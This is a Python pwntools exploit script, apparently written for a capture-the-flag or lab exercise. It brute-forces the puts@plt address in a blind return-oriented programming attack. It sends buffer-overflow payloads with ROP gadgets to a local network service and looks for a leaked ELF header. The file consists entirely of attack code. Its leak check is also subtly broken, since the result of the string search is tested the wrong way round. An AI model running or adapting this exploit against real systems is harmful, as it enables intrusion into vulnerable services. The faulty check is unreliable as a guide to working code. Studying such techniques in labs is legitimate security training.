#-*- coding:utf-8 –*-
from pwn import *
from LibcSearcher import LibcSearcher
context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')
#log_level=['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
def get_puts_addr(length, rdi_ret, stop_gadget):
	addr = 0x400630
	while 1:
		print hex(addr)
		sh = remote('127.0.0.1', 10001)
		sh.recvuntil('Please tell me:')
		payload = 'A' * length + p64(rdi_ret) + p64(0x400000) + p64(
			addr) + p64(stop_gadget)
		sh.sendline(payload)
		try:
			sh.recv()
			content = sh.recv()
			if content.find('\x7fELF'):
				print 'find puts@plt addr: 0x%x' % addr
				return addr
			sh.close()
			addr += 1
		except Exception:
			sh.close()
			addr += 1
length = 216
stop_gadget = 0x4007d6
brop_gadget = 0x40095a
rdi_ret = brop_gadget + 9
puts_plt = get_puts_addr(length,rdi_ret,stop_gadget)

print hex(puts_plt)
#0x400635
